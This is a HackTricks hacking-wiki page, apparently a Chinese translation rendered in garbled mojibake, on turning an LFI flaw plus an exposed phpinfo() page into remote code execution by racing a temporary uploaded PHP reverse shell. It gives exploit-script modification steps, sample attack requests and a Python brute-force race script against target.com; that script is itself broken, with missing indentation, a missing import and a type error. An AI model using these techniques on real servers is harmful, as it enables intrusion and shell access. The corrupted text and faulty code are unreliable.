{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}


è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ‚¨éœ€è¦ï¼š**ä¸€ä¸ª LFI æ¼æ´ï¼Œä¸€ä¸ªæ˜¾ç¤º phpinfo() çš„é¡µé¢ï¼Œâ€œfile\_uploads = onâ€ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¿…é¡»èƒ½å¤Ÿåœ¨â€œ/tmpâ€ç›®å½•ä¸­å†™å…¥ã€‚**

[https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

**æ•™ç¨‹ HTB**ï¼š [https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s](https://www.youtube.com/watch?v=rs4zEwONzzk\&t=600s)

æ‚¨éœ€è¦ä¿®å¤æ¼æ´ï¼ˆå°† **=>** æ›´æ”¹ä¸º **=>**ï¼‰ã€‚ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š
```
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```
æ‚¨è¿˜éœ€è¦æ›´æ”¹æ¼æ´åˆ©ç”¨çš„**payload**ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨php-rev-shellï¼‰ï¼Œ**REQ1**ï¼ˆè¿™åº”è¯¥æŒ‡å‘phpinfoé¡µé¢å¹¶åŒ…å«å¡«å……ï¼Œå³ï¼š_REQ1="""POST /install.php?mode=phpinfo\&a="""+padding+""" HTTP/1.1_ï¼‰ï¼Œä»¥åŠ**LFIREQ**ï¼ˆè¿™åº”è¯¥æŒ‡å‘LFIæ¼æ´ï¼Œå³ï¼š_LFIREQ="""GET /info?page=%s%%00 HTTP/1.1\r --_ åœ¨åˆ©ç”¨ç©ºå­—ç¬¦æ—¶æ£€æŸ¥åŒâ€œ%â€ï¼‰

{% file src="../../.gitbook/assets/LFI-With-PHPInfo-Assistance.pdf" %}

### ç†è®º

å¦‚æœåœ¨PHPä¸­å…è®¸ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶ä¸”æ‚¨å°è¯•ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ™è¯¥æ–‡ä»¶ä¼šå­˜å‚¨åœ¨ä¸´æ—¶ç›®å½•ä¸­ï¼Œç›´åˆ°æœåŠ¡å™¨å¤„ç†å®Œè¯·æ±‚ï¼Œç„¶åè¯¥ä¸´æ—¶æ–‡ä»¶ä¼šè¢«åˆ é™¤ã€‚

ç„¶åï¼Œå¦‚æœæ‚¨åœ¨WebæœåŠ¡å™¨ä¸­å‘ç°äº†LFIæ¼æ´ï¼Œæ‚¨å¯ä»¥å°è¯•çŒœæµ‹åˆ›å»ºçš„ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼Œå¹¶é€šè¿‡åœ¨æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰è®¿é—®ä¸´æ—¶æ–‡ä»¶æ¥åˆ©ç”¨RCEã€‚

åœ¨**Windows**ä¸­ï¼Œæ–‡ä»¶é€šå¸¸å­˜å‚¨åœ¨**C:\Windows\temp\php**

åœ¨**linux**ä¸­ï¼Œæ–‡ä»¶çš„åç§°é€šå¸¸æ˜¯**éšæœºçš„**ï¼Œå¹¶ä½äº**/tmp**ã€‚ç”±äºåç§°æ˜¯éšæœºçš„ï¼Œå› æ­¤éœ€è¦**ä»æŸå¤„æå–ä¸´æ—¶æ–‡ä»¶çš„åç§°**å¹¶åœ¨å…¶è¢«åˆ é™¤ä¹‹å‰è®¿é—®å®ƒã€‚è¿™å¯ä»¥é€šè¿‡è¯»å–å‡½æ•°â€œ**phpconfig()**â€å†…å®¹ä¸­çš„**å˜é‡$\_FILES**çš„å€¼æ¥å®Œæˆã€‚

**phpinfo()**

**PHP**ä½¿ç”¨**4096B**çš„ç¼“å†²åŒºï¼Œå½“å®ƒ**æ»¡**æ—¶ï¼Œå®ƒä¼šè¢«**å‘é€åˆ°å®¢æˆ·ç«¯**ã€‚ç„¶åå®¢æˆ·ç«¯å¯ä»¥**å‘é€** **å¤§é‡å¤§è¯·æ±‚**ï¼ˆä½¿ç”¨å¤§å¤´éƒ¨ï¼‰**ä¸Šä¼ php**åå‘**shell**ï¼Œç­‰å¾…**phpinfo()çš„ç¬¬ä¸€éƒ¨åˆ†è¿”å›**ï¼ˆå…¶ä¸­åŒ…å«ä¸´æ—¶æ–‡ä»¶çš„åç§°ï¼‰ï¼Œå¹¶å°è¯•åœ¨phpæœåŠ¡å™¨åˆ é™¤æ–‡ä»¶ä¹‹å‰é€šè¿‡åˆ©ç”¨LFIæ¼æ´**è®¿é—®ä¸´æ—¶æ–‡ä»¶**ã€‚

**Pythonè„šæœ¬å°è¯•æš´åŠ›ç ´è§£åç§°ï¼ˆå¦‚æœé•¿åº¦=6ï¼‰**
```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
url = 'http://target.com/index.php?c=/tmp/php' + fname
r = requests.get(url)
if 'load average' in r.text:  # <?php echo system('uptime');
print('[+] We have got a shell: ' + url)
sys.exit(0)

print('[x] Something went wrong, please try again')
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
